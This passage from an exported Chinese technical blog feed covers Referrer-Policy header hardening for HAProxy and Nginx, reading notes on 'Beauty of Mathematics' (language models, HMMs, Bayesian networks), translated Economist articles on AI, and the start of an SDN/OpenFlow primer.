Policy 的新草案，开发者开始有权控制自己网站的 Referrer Policy。但是仅有 Chrome／Firefox 浏览器较新的版本的能够提供支持。 Feature Chrome Firefox Edge、Internet Explorer、 Opera、Safari Basic Support 56.0 50.0 (No) same-origin (No)1 52.0 (No) strict-origin (No)1 52.0 (No) strict-origin-when-cross-origin (No)1 52.0 (No) Referrer-Policy选项列表： Referrer-Policy: no-referrer //整个 Referer 首部会被移除。访问来源信息不随着请求一起发送。 Referrer-Policy: no-referrer-when-downgrade //默认选项//引用页面的地址会被发送(HTTPS-&gt;HTTPS)，降级的情况不会被发送 (HTTPS-&gt;HTTP) Referrer-Policy: origin //在任何情况下，仅发送文件的源作为引用地址 Referrer-Policy: origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址，但是对于非同源请求仅发送文件的源 Referrer-Policy: same-origin //对于同源的请求会发送引用地址，但是对于非同源请求则不发送引用地址信息。 Referrer-Policy: strict-origin //在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS-&gt;HTTPS) Referrer-Policy: strict-origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址 Referrer-Policy: unsafe-url //无论是否同源请求，都发送完整的 URL（移除参数信息之后）作为引用地址。 我们必须确保用户从全 HTTPS 站点跳转到 HTTP 站点的时候，没有中间人可以嗅探出用户实际的 HTTPS URL，Referrer Policy 设置如下： 1234//HAProxyhttp-response set-header Referrer-Policy no-referrer-when-downgrade//Nginxadd_header Referrer-Policy: no-referrer-when-downgrade Source Destination Referrer （Policy :no-referrer-when-downgrade） https://test.com/blog1/ http://test.com/blog2/ NULL https://test.com/blog1/ https://test.com/blog2/ https://test.com/blog1/ http://test.com/blog1/ http://test.com/blog2/ http://test.com/blog1/ http://test.com/blog1/ http://example.com http://test.com/blog1/ http://test.com/blog1/ https://example.com http://test.com/blog1/ https://test.com/blog1/ http://example.com NULL 测试安全研究员 Scott Helme 贡献了一个非常棒的网站 [https://securityheaders.io/]，可以分析自己站点的Header(报文头)，并提出改进安全性的建议。示例如下（环境参数，Operating System: CentOS 7 ; haproxy 1.5.14 ; nginx 1.12.0）。 加固前的检测结果 加固后的检测结果 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 HTTP headers for the responsible developer SSL Man-in-the-Middle Attacks|SANS Institute InfoSec Reading Room A new security header: Referrer Policy | Scott Helme 《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》 The WiFi Pineapple - Using Karma and SSLstrip to MiTM secure connections | Scott Helme Content Security Policy - An Introduction | Scott Helme Content Security Policy 入门教程 | 云栖社区 Referrer Policy 介绍 | Jerry Qu]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记|数学之美（Beauty Of Mathmetics）]]></title>
    <url>%2F2017%2F08%2F30%2FMathmetics-Beauty%2F</url>
    <content type="text"><![CDATA[摘要 作者：吴军 起源：Google中国的官方博客–谷歌黑板报连载的系列博客 主题：自然语言处理、科技史 数学的魅力就在于将复杂的问题复杂化 人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。（p49） 《数学之美》 Topic 自然语言识别与概率论：第 3、5、24 章 信息论：第 6 章 第一章 文字和语言 vs 数字和信息故事：罗赛塔石牌、犹太人抄圣经（校验）、口语和文言文（信道压缩） 通信的原理和信息传播的模型 （信源）编码和最短编码 解码的规则，语法 聚类 校验位 双语对照文本，语料库和机器翻译 多义性和利用上下文消除歧义性 第二章 自然语言处理——从规则到统计Tips: 宾夕法尼亚大学语言数据库（LDC） 图灵测试（阿兰-图灵(Alan Turing） ): 让人和机器交流，如果人无法判断自己交流的对象是否为机器时，就说明机器有智能了。 自然语言发展阶段 20世纪50-70年代：基于规则的方法，电脑模拟人脑理解语法、文法，收效甚微 20世纪70年代以后：基于数学模型和统计的方法。例如翻译，计算机不需要像人类一样理解两种语言。 人物 明斯基（达特茅斯会议的发起者之一）:著名人工智能专家,对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。 弗里德里克-贾里尼克（Frederick Jelinek) | IBM:领导 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破,语言识别70%-&gt;90% 长达15年的对峙时期两派人马各自召开自己的会议，持续争议。 基于统计方法的发展 上世纪70年代：基于统计的方法的核心模型是通信系统加隐含马尔可夫模型。输入和输出都是一维的符号序列，保持原有的次序。最早的语音识别、词性分析取得成果；句法分析中输入的是一维的句子，输出的是二维的分析树；机器翻译中，输出的句子次序会有很大变化，效果不佳。 1998年，彼得·布朗(Peter Brown) | IBM 等提出了基于统计的机器翻译方法效果很差，模型、数据不足。（文艺复兴技术公司） 基于有向图的统计模型解决复杂的句法分析。 20世纪90年代末期：通过统计得到的句法规则甚至比语言学家总结的更有说服力。 2005年，Google 基于统计方法的翻译系统全面超过基于规则方法的 SysTran 翻译系统 科学史的教训：等待老科学家退休 基于统计的方法代替传统的方法，需要等原有的一批语言学家退休。“老的科学家” 或者 “老科学的家” （钱钟书《围城》），后一种年纪不算老，但是已经落伍，大家必须耐心等待他们退休让出位子。毕竟，不是所有人都乐意改变自己的观点，无论对错。 …… 因此，我常想，我自己一定要在还不太糊涂和固执时就退休（p25） 第三章 统计语言模型计算机处理自然语言的基本问题：为自然语言这种上下文相关的特性建立数学模型，即 统计语言模型（Statistical Language Model） 贾里尼克：一个句子是否合理，就看看它的可能性大小如何。可能性用概率来衡量。 P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W1,W2) ··· P(Wn | W1,W2, … , Wn-1) S 表示某一个有意义的句子，由一连串特定顺序排列的词W1,W2, ··· , Wn 组成，n 是句子的长度。句子越长，条件概率 P(Wn | W1,W2, … , Wn-1) 的可能性越多，无法估算。 19 世纪到 20 世纪初，马尔可夫（Andrey Markov）提出假设，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下： P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1) 语料库（ Corpus ）: 大量机读样本相对频度根据 大数定理（ Law of Large Numbers ），只要统计量足够，相对频度就等于概率推导过程省略（P30） 延伸阅读：统计语言模型的工程诀窍 2.1 高阶语言模型很少有人能使用四元以上的模型，Google 的罗塞塔翻译系统和语言搜索引擎使用四元模型，该模型存储于 500 台 以上的 Google 服务器中。 马尔可夫假设的局限性：自然语言中上下文相关性跨度可能非常大，需采用其他一些 长程的依赖性（ Long Distance Dependency ） 来解决。 2.2 模型的训练、零概率问题和平滑方法 古德·图灵估计（ Good-Turing Estimate） 一种概率估计方法：1953年，古德（ I. J. Good）、图灵（ Alan Turing ）提出，在统计中相信可靠的统计数据，而对不可信的统计数据打折扣，同时将折扣出来的那一小部分概率给予未看见的事件（ Unseen Events ）。 如果训练语料与模型应用的领域相脱节，那么模型的效果通常要大打折扣。例如腾讯搜索部门的语言模型，最早使用《人民日报》的语料训练（干净、无噪音），实际效果不佳，之后使用网页的数据，尽管有很多噪音但是训练数据与应用一致，搜索质量反而好。 第四章 谈谈中文分词 早期的分词：《说文解字》和《论语》注解，目的都是为了以一家的理解消除歧义性 分词准确率：不是越高越好，而要看所谓正确的人工分词的数据是如何得来的。我们甚至只能讲某个分词器和另一个分词器相比，与人工分词结果的吻合度稍微高一点而已。目前采用统计语言模型，（选择哪种分词器）效果都差不到哪里去。 第五章 隐含马尔可夫模型计划：201706通读：201709 人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。但是自然语言处理早期的努力都集中在语法、语义和知识表述上，离通信的原理越来越远，而这样答案也就越来越远。当自然语言处理的问题回归到通信系统中的解码问题时，很多难题都迎刃而解了。（p49） 雅格布森（ Roman Jakobson）提出的通信六个要素 1234567891011digraph communicate&#123; label="雅格布森提出的通信六个要素"; 信息和上下文[label = "信息和上下文(发送者)"]; 传递的信息[label = "传递的信息(信道)"]; 接收的信息[label = "接收的信息(接收者)"]; 信息和上下文 -&gt; 传递的信息[label = "编码(S1,S2,S3,···)"]; 传递的信息 -&gt; 接收的信息[label = "解码(O1,O2,O3,···)"];&#125; 马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。 123456789digraph markov&#123; label = " 马尔可夫模型（ Markov Model ）"; rankdir = LR; m1-&gt;m2[label = "1.0"]; m2-&gt;m3[label = "0.6"]; m3-&gt;m4[label = "0.3"]; m2-&gt;m4[label = "0.4"]; m3-&gt;m3[label = "0.7"];&#125; 隐含马尔可夫模型（ Hidden Markov Model ）最早由20世纪六七十年代，美国数学家鲍姆（ Leonard E. Baum ） 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。 123456789101112131415digraph hiddenmarkov&#123; label = " 隐含马尔可夫模型（ Hidden Markov Model ）"; rankdir = LR; S1-&gt;S2[label = ""]; S1-&gt;O1[label = ""]; S2-&gt;S3[label = ""]; S2-&gt;O2[label = ""]; S3-&gt;S4[label = ""]; S3-&gt;O3[label = ""]; S4-&gt;O4[label = ""];&#125; 隐马尔可夫模型的应用隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。 延伸阅读隐含马尔可夫模型的训练 知识背景：概率论 围绕隐含马尔可夫模型的基本问题 给定一个模型，如何计算某个特定输出序列的概率；Forward-Backward 算法参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》 给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列解码算法：维特比算法 给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm） 第六章 信息的度量和作用 信息熵要搞清楚意见非常非常不确定的事，或是我们一无所知的事情，就需要了解大量的信息。相反，如果我们对某件事已经有了较多的了解，那么不需要太多的信息就能把它搞清楚。所以，从这个角度来看，可以认为，信息量就等于不确定性的多少。 信息的作用在英语里，信息和情报是同一个词（ Information ），而我们知道情报的作用就是排除不确定性。 案例：斯大林、日军南下战略情报 如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记。 几乎所有的自然语言处理、信息与信号处理的应用都是一个消除不确定性的过程。 延伸阅读：信息论在信息处理中的应用 信息熵 冗余度 ( Redundancy ) 互信息 ( Mutual Information )，量化地度量相关性 相对熵 ( Relative Entropy 或 Kullback-Leibler Divergence ) 信息论参考文献 《A Mathematic Theory of Communication》(“通信的数学原理”)，香农（ Claude Shannon ）,1948 《Elements of Information Theory》(“信息论基础”)，托马斯·科弗（ Thomas Cover ） 第七章 贾里尼克和现代语言处理第八章 简单之美——布尔代数和搜索引擎的索引第九章 图论和网络爬虫计划：201706通读：20170927 交通路径规划 深度优先搜索（ Depth-First Search , DFS） 广度优先搜索（ Breadth-First Search , BFS） 网络爬虫 ( Web Crawlers ) ：超链接 ( Hyperlinks ) 延伸阅读：图论的亮点补充说明 欧拉七桥问题的证明 构建网络爬虫的工程要点：1）搜索引擎的调度（BFS） 2）页面分析和 URL 的提取 3）记录哪些网页已经下载（ URL 表） 很多数学方法就是这样，看上去没有什么实际用途，但是随着时间的推移会一下子派上大用场。这恐怕是世界上还有很多人毕生研究数学的原因。 第十章 PageRank——Google的民主表决式网页排名技术第十一章 如何确定网页和查询的相关性第十二章 地图和本地搜索的最基本技术——有限状态机和动态规划第十三章 Google AK-47的设计者——阿米特-辛格博士第十四章 余弦定理和新闻的分类第十五章 矩阵运算和文本处理中的两个分类问题第十六章 信息指纹及其应用第十七章 由电视剧《暗算》所想到的——谈谈密码学的数据原理计划：201706 第十八章 闪光的不一定是金子——谈谈搜索引擎反作弊问题第十九章 谈谈数学模型的重要性第二十章 不要把鸡蛋放在一个篮子里——谈谈最大熵模型第二十一章 拼音输入法的数学模型第二十二章 自然语言处理的教父马库斯和他的优秀弟子们第二十三章 布隆过滤器第二十四章 马尔可夫链的扩展——贝叶斯网络计划：201706通读：20170925 贝叶斯网络（Bayesian network） 是一种概率图型模型。 一般而言，贝叶斯网络中的节点表示随机变量，连接两个节点的箭头代表此两个随机变量是具有因果关系的；而两个节点间若没有箭头相互连接一起，表明他们之间没有直接的因果关系（注：并不表明A不会通过其他状态间接地影响状态B）。所有这些（因果）关系，都可以有一个量化的可信度（Belief）,用一个概率描述。也就是说，贝叶斯网络的弧上可以有附加的权重。因此，贝叶斯网络也被称作 信念网络（Belief Networks） 或者 有向无环图模型（directed acyclic graphical model） 。 案例：描述心血管疾病和成因一个简单的贝叶斯网络案例，描述心血管疾病和成因。 12345678910111213digraph diseaseCVD&#123; label=&quot;\n 案例：一个描述心血管疾病和成因的贝叶斯网络 \n&quot;; 心血管疾病-&gt;胆固醇量; 心血管疾病-&gt;血脂; 心血管疾病-&gt;吸烟; 心血管疾病-&gt;运动量; 心血管疾病-&gt;家族病史; 胆固醇量-&gt;运动量; 胆固醇量-&gt;饱和脂肪摄取量; 胆固醇量-&gt;家族病史; 血脂-&gt;饱和脂肪摄取量; 血脂-&gt;家族病史;&#125; 上面的例子进一步简化之后，假定只有三个状态 “心血管疾病”，“高血脂”和“家族病史”。假定每个状态只有“有”、“无”两种，并且给出组合状态的条件概率。 123456digraph SimpleDiseaseCVD&#123; label=&quot;\n 案例：心血管疾病和成因的贝叶斯网络（简化） \n&quot;; 心血管疾病-&gt;高血脂; 心血管疾病-&gt;家族病史; 高血脂-&gt;家族病史;&#125; 心血管疾病 家族病史、高血脂 有 无 有 有 0.9 0.1 有 无 0.4 0.6 有 有 0.4 0.6 有 无 0.1 0.9 高血脂 家族病史 有 无 有 有 0.4 0.6 有 无 0.1 0.9 联合概率分布（贝叶斯公式）： P(家族病史，高血脂，心血管疾病) = P（家族病史|高血脂，心血管疾病）x P（高血脂|家族病史）x P（家族病史） 例如，计算心血管疾病有多大概率是由家族病史引起的。 P(家族病史|有心脏病) = P（有家族病史，有心脏病）/ P（有心脏病） 其中： P(有家族病史，有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂） P(有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂）+ P（无家族病史，有心脏病，无高血脂）+ P（无家族病史，有心脏病，有高血脂） P(有家族病史，有心脏病) = 0.18 x 0.4 + 0.12 x 0.4 = 0.12 P(有心脏病) = 0.12 + 0.08x0.4 + 0.72x0.1 = 0.12 + 0.144 = 0.264 第二十五章 条件随即场和句法分析第二十六章 维特比和他的维特比算法第二十七章 再谈文本自动分类问题——期望最大化算法第二十八章 逻辑回归和搜索广告第二十九章 各个击破算法和Google云计算的基础第三十章 逻辑回归和搜索广告扩展阅读 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 Why draw when you can code? Graphviz 简介 最佳 Graphviz 实践：流程图、数据结构图、网络路径 Trace Route、复杂社会关系链分析、机器学习算法-决策树(Decision Tree) 参考文献 How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
        <tag>科技史</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI产业资讯|经济学人报道合辑]]></title>
    <url>%2F2017%2F08%2F29%2FMachine-Learning-News%2F</url>
    <content type="text"><![CDATA[摘要 媒体报道|经济学人：No PhD, No Problem | 20181025 媒体报道|经济学人：译者的悲伤 | 20170527 媒体报道|经济学人：计算机如何学习人类语言？| 20170111 人物摘要 杰里米·霍华德（Jeremy Howard）:数据科学家，Fast.ai 创始人 雷切尔·托马斯（Rachel Thomas）:数学家，Fast.ai 创始人 Andrei Karpathy：director of artificial intelligence and Autopilot Vision at Tesla 吴恩达（ Andrew Ng ）: 斯坦福/百度/deeplearning.ai 经济学人：人人都能构建智能软件日期：2017年10月25日标题：No PhD, No Problem副标：New schemes teach the masses to build AI Treating it like a craft is paying dividends来源：https://www.economist.com/business/2018/10/25/new-schemes-teach-the-masses-to-build-ai 在过去的五年中，人工智能研究人员已经成为科技界的摇滚明星。深度学习（deep learning）是人工智能（artificial intelligence，AI）领域的一个分支 —— 基于神经网络探索大数据以实现模式识别能力。熟练掌握该方法构建软件的从业者可以在业界获得高达六位数的薪酬，包括亚马逊，苹果，Facebook 和谷歌等科技巨头。顶级专家年薪超过 100 万美元。 过去，进入人工智能领域的标准途径是从一所美国精英大学获得计算机科学博士学位。获得一个需要多年经验、并且适合学术界的职位，这些对于普通民众而言难以企及。研究生通常被有利可图的工作所吸引。 常识正在发生变化。今年十月，Fast.ai （一家位于旧金山的非盈利性教育机构）发布深度学习课程已经三周年。Fast.ai 自成立以来吸引了超过 10 万名学生，学生来源分布在全球各地，从印度到尼日利亚。与其他类似的课程一样，它们都有一个简单的主张：没有必要花费数年时间获得博士学位以实践深度学习。构建智能软件可以作为一种手艺来教学，而不是仅仅在象牙塔中进行的高智力游戏。 Fast.ai 的课程可在短短七周内完成。 数据科学家杰里米·霍华德（Jeremy Howard）与数学家雷切尔·托马斯（Rachel Thomas）一起创立 Fast.ai，他的目标是为了让任何想要知道如何构建智能软件的人都能够获得学习机会。他说学校的数学就足够了。 Fast.ai 初见成效。Sara Hooker 之前从未从事过深度学习，在 Fast.ai 完成课程后毕业的第一年就被竞争激烈的 Google AI Residency Program 雇佣（2015 年创建，旨在培训和支持下一代深度学习研究人员）。她现在是位于加纳首都阿克拉的人工智能研究办公室的创始成员，该办事处是 Google 在非洲的第一家智能研究机构。在班加罗尔，约有 2,400 人是 ai Saturdays 的成员，他们作为一个巨大的研究小组一起跟随课程学习。Andrei Karpathy （特斯拉自动驾驶仪视觉总监）是深度学习的最重要的从业者之一，他同样推荐这门课程。 Fast.ai 不是唯一的替代方案。 ai4all 是另一家非营利性企业，致力于为美国学童提供 AI 教育。吴恩达（ Andrew Ng ）是该领域的另一位知名人物（斯坦福大学计算机科学系和电气工程系副教授，斯坦福人工智能实验室主任，百度公司原首席科学家），他已经建立了自己的在线学习课程项目 deeplearning.ai 。 霍华德先生的雄心壮志远远超过畅通 AI 劳动力市场。他的目标是将深度学习方法传播到大众手中，以便该方法可以被尽可能多样化的人群应用于各种各样的领域。到目前为止，深度学习几乎由少数年轻的白人控制，几乎所有白人都受雇于科技巨头公司。霍华德先生雄心勃勃地表示，他的目标是让基于人工智能的软件变得像在智能手机上发送电子邮件一样易于使用、无处不在。 一些专家对此表示担忧。很有可能因此建造大量不可靠的人工智能系统，这些系统在理想的情况下是无用的，在最坏的情况下是危险的。回顾科技史可以消除这些担忧。在互联网早期阶段，只有少数具有特定技能的爱好者才能构建应用程序，同时也没有多少人使用这些应用程序。随后，万维网的发明导致了网页数量的爆炸式增长，且无论它们是好是坏。但是，只有开放的互联网才能实现在线购物、全球即时通信和搜索。如果霍华德先生和其他人能够找到他们的成功之路，将人工智能软件的开发变得更容易，就能给世界带来一种新的、不同以往的选择。 Data Science Workshops 经济学人：计算机如何学习人类语言？日期：2017年1月11日标题：How machines learned to speak human language副标：And what does that mean for the way people use computers?来源：[http://www.economist.com/blogs/economist-explains/2017/01/economist-explains-6] 今年圣诞节数以百万计的人将得到一种装有电子设备的盒子——能够快速地提高使用人类语言的能力。亚马逊的 Echo 设备，配备了一个名为 Alexa 的数字助理，现在在500多万户家庭中出现。 Echo 是一个圆筒形的台式电脑，除了声音之外没有其它接口。你可以要求 Alexa 播报天气信息，播放音乐，预定出租车，告知通勤路程或讲一个老掉牙的笑话，它都会响应。来自美国电脑巨头的语音驱动式数字助理（谷歌的 Assistant、微软的 Cortana和苹果的 Siri）也已经取得了很大的进步。计算机是如何处理人类语言的问题呢？ 曾经的想法是将教机器学习语言规则，例如翻译，使用一套语法规则来打破源语言的意义，再用另一组用来重现目标语言中的意思。但是经历过20世纪50年代的乐观情绪过后，业界发现这种系统不能用于复杂的新句子；基于语言规则的方法很难大规模扩展应用。用于人类语言识别技术的研究投资进入了长达几十年的蛰伏期，直到20世纪80年代的迎来复兴时期。[注：著名人工智能专家明斯基（达特茅斯会议的发起者之一）对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。弗里德里克-贾里尼克（Frederick Jelinek)及其领导的 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破。] 实际上，人类语言识别技术可以通过模式匹配的形式来自我学习。例如语音识别，计算机一边输入语音文件作为语料，另一边是人工编辑的译本作为的译本。系统学着预测这些语音的结果“听起来”应该属于那个译本。在翻译过程中，训练数据是源语言文本和人工翻译的文本。系统自主学习、匹配它们之间的模式。提高语音识别和翻译能力的一个因素是“语言模型”—— 一个关于英语句子的知识库。这大大缩小了系统的预测工作量。 最近有三件事使这种方法取得了巨大的飞跃：首先，计算机的运算能力比过去强大得多。第二，它们可以从海量的、日益增长的数据中学习，不管是在因特网上公开获取还是公司私下收集的。第三，所谓的“深度学习”（deep learning），它使用包括多层次的数字“神经元”及其连接的数字神经网络，使得该系统非常善于从例子中学习。 所有这一切都意味着，计算机现在非常善于回答具备明确定义的问题。例如 “明天伦敦的气温是多少？” （公平地说，你不必是一台电脑也能知道明天伦敦会下雨）。用户甚至可以用更自然的方式询问，比如“明天我应该带伞去伦敦吗？”（数字助理不断地从人们不同的提问方式中学习），但是问一个开放式的问题（“明天伦敦有什么有趣或者可以薅羊毛的事情吗？”）通常你只会得到一个来自搜索引擎结果的列表。 随着机器学习（ machine learning）的改进，当用户的智能设备更加熟悉他们时，这样的答案将变得更加有用。这意味着隐私倡导者的麻烦，但是参考过去几年手机应用的情况来看，消费者将作出权衡，他们通常非常高兴能获得新功能。 经济学人：译者为何忧虑？日期：2017年5月27日译者：LynnTra@经济学人翻译社链接：http://www.jianshu.com/p/368f14a1e5b6來源：https://www.economist.com/news/books-and-arts/21722609-profession-under-pressure-why-translators-have-blues 翻译(本文仅指笔译)可以是一份孤独的工作，这就很好地解释了为什么大多数翻译选择这项职业是出于自身兴趣，而不是关注度。不久之前，可以说一名合格译员都可以谋得一个稳定体面的生活，但是翻译行业正经历着扭曲的变革，让胆小者感受到谋生之艰。 大多数翻译都是自由职业者，随着因特网的普及，一名合格译员可以入住在肯塔基州但服务于瑞士银行。但是网络互通也导致了激烈的全球竞争，随之即是大幅压价。译员们要么拼命多做或者抢酬劳高的活－这意味着实际翻译的时间少了－要么找一家能帮他们争取到任务的代理机构，但这意味着佣金抽取。除了自己单干或者和代理机构合作，译员还可以在线上市场宣传自身技能，但这暴露了最残忍的竞价压力：像译文千字 13-15 美金这么低的价格也不是没有。以前50美金左右就算低价翻译，那时候文学翻译大概是120美金，高价是250美金。在线上市场，几乎不懂外文和译文质量的买家几乎单纯按价格进行买卖。 职业压力还有另外一个出处：较高质量的机器翻译的涌现。仅仅是一年前，机器翻译的结果还不可靠：内容上不准确，且常不具可读性。而如今这两个缺陷都由基于所谓深度神经网络的翻译引擎大幅改善。几乎可以确定那些报特低价的译员们使用了翻译软件，然后直接针对译文的准确度和可读性进行快速编辑。总体来看，大的翻译机构都对这些科技和其广阔可能性拍手叫好。但是，另译员们本身感受担忧的是，自己的未来除了这种科技大清洗，智力上的愉悦感，别无其它了。对于所有现役译员来说，受影响者都不开心。为了避免成为“未来捡咖啡豆的人”，老译员建议提高专业领域知识和写作技能，以争取高端翻译。但并非人人都能做到。身在普遍性和中端市场的翻译们必然更多的是做编辑工作，否则就是被挤出局。 那剩下的翻译们何去何从呢？其一，文学翻译不受威胁。2001至2015年间，在英国，经翻译的小说售量上升了600％还不止，在美国也一直处于强劲增长中。像埃莱娜·费兰特（Elena Ferrante）这样的大作家也建议这些国家的读者们跳出自己的国度找好书。没人会相信一部机器可以翻译出一本小说。罗伊.雅各布森（Roy Jacobsen）的《看不见的事物》（Unseen）被列入2017年布克国际文学奖（Man Booker International Prize－MBIP）决选名单，原本的挪威岛方言经由唐.巴特利特（Don Bartlett）和唐.肖（Don Shaw）地道译出了带有同样风味的英文：“Hvur bitty it is!”（“How small it is!”“这个真是太小了！”）。MBIP让本书原作者和译者共享奖金，认可了翻译事实上是一种创作。 大多数翻译属于商业翻译，但那也属于一种创作。高管们常常否定一份讲稿或者一封信件的译文，因为那看起来不像他们的原作。但是一名好译员需要再度思考文章本身、重述重要篇章、分解或合并句段，如此等等。翻译软件可以做到准确，但它是逐句翻译。由于语言在考量句子好坏时基于不同的节奏、有不同的期待，因此软件效果可能是一团糟。所以翻译最好的办法只能是先思考原语所指深意，再重新创作。 另一个市场就是“译创”（transcreation），常见于广告业，这里要求译员重新思考一条信息，确保它在新语言（译语）中的版本具备正确的文化参照、笑点等诸如此类，来复刻原语的影响力，跳出语言本身。在这种情况下，“译创员”相比大多数译员来说，更是一名原创作者。 正在被科技重塑的翻译工作很难是一项孤独的工作了。法律、会计以及其它很多可敬的工作正见证着重复性脑力工作由机器完成，效果差强人意。未来的翻译想要做得真好，需要的不仅仅是语言和写作技能，还必须获得客户信任、站在客户角度考虑，就像律所或者会计所的合伙人。换句话说，翻译行业里的孤独者可能举步维艰了。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 如何创造像样的人造语言 | 大象公会 机器学习翻译和谷歌翻译算法 | Daniil Korbut (Junior Data Scientist at Statsbot) 利用机器学习技术监测集约型畜牧业 | 《自然-可持续性》 | 原创： Nature自然科研 Nature自然科研 4月9日 机器人会得抑郁症吗？ | 原创： Zachary Mainen 酷炫脑 2018-05-03]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（二）：OpenFlow]]></title>
    <url>%2F2017%2F08%2F22%2FSDN-OpenFlow%2F</url>
    <content type="text"><![CDATA[摘要 OpenFlow 简史（SDN != OpenFlow ; 版本问题） OpenFlow 工作原理 OpenFlow is a communications protocol 支持 OpenFlow 的开源交换机：Open vSwitch 回顾 SDN 技术指南（一）：架构概览 Background：为什么需要 SDN SDN的主要解决方案 SDN的整体应用架构 History: OpenFlow != SDNOpenFlow 最早由斯坦福大学提出，目前知识产权由开放网络基金会（Open Networking Foundation，ONF)持有。SDN 和 OpenFlow 两个概念经常会被混淆和误读。这也难怪，从历史上看，两者还这是你中有我、我中有你。首先，作为一个开放的协议，OpenFlow 协议是众多 SDN 控制器解决方案的实现基础；另外，定义 SDN 概念和架构背后的许多重要人物开始在 OpenFlow 领域取得了突破，进而推动 SDN 概念走向成熟。 OpenFlow is a key protocol in many SDN solutions. 在传统的网络交换设备中，转发平面（通常采用专门的芯片以提高性能）与控制平面（分布地部署在网络的各个节点）是紧密耦合的，被集成实现在单独的设备中。当然，从另一个角度看这样的设计也有合理性，至少能提高单个节点的灵活性和容灾能力。但是众多厂商各自为政，更出于技术保密、保持市场的考虑，对于开放接口供用户调用、建立行业标准的兴趣不大。OpenFlow 协议的推出突破了传统壁垒，有利于增加用户侧的话语权，所以 Google、Facebook 等企业是 OpenFlow 协议最坚强的拥趸，他们的数据中心都在使用 OpenFlow 协议，并倡议发起成立 ONF 来推动这个技术。 1995: Sun Microsystems 在1995年就提出软件定义网络的概念（在公开 JAVA 编程语言之后不久） 2006: Martin Casado(a PhD students at Stanford)及其团队首次提出了一个集中式安全控制的框架 2008: OpenFlow paper 《Architectural Support for Security Management in Enterprise Networks》 （人物： Nick McKeown 、Scott Shenker 、Dan Boneh） 2009: Stanford 发布 OpenFlow V1.0.0 ; Martin Casado co-founds Nicira （主导 Open vSwitch） 2010: Guido Appenzeller co-founds Big Switch Networks (head of clean slate lab at Stanford) 2011: Open Networking Foundation is formed Oct 2011: First Open Networking Summit. July 2012: VMware buys Nicira for $1.26B Nov 6, 2013: Cisco buys Insieme for $838M OpenFlow 的版本问题OpenFlow 协议简单来说就是把路由器的控制平面（Control Plane，管理路由表、负责网络配置和系统管理等）从转发平面（Forward Plane，转发决策和输出链路调度等）中分离出来，以软件方式实现。从第一个正式商用版本 v1.0 开始，OpenFlow 有先后推出了v1.1,v1.2,v1.3,v1.4 等，版本之间存在不兼容的内容， OpenFlow 